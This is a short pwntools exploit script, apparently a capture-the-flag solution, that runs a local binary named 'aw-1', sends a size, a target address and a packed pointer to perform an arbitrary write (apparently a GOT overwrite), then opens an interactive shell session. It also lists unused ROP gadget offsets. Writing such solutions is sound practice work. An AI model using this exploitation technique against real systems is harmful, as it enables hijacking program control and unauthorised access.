#!/usr/bin/python

from pwn import *
import time

poprdi = 0xa33 #: pop rdi ; ret
poprsi = 0xa31 #: pop rsi ; pop r15 ; ret

p = process("./aw-1")
p.sendline("8")
time.sleep(.15)
p.sendline("0x602028")
time.sleep(.15)
p.sendline(p64(0x400851))
p.interactive()
